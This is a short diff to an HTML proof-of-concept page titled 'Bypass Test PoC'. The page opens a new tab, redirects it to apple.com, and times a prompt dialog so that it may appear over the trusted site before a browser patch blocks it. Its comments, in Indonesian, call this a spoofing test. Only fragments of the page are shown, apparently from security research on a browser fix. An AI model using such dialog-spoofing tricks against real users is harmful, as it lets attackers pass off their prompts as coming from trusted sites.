@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Bypass Test PoC</title>
+    <title>Bypass Test, PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -30,7 +30,7 @@
     </style>
   </head>
   <body>
-    <button id="startBtn">TEST BYPASAS CLICK</button>
+    <button id="startBtn">TEST  CLICK</button>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
@@ -57,8 +57,8 @@
 
           // Navigasi asinkron ke target spoofing
           setTimeout(() => {
-            newTab.location.href = "https://apple.com";
-          }, 200);
+            newTab.location.href = "https://apple.com:9090";
+          }, 70);
 
           // Memanggil prompt sedikit lebih cepat/bersamaan untuk melihat 
           // apakah dialog lolos sebelum IsVisible() bernilai false atau terblokir patch.
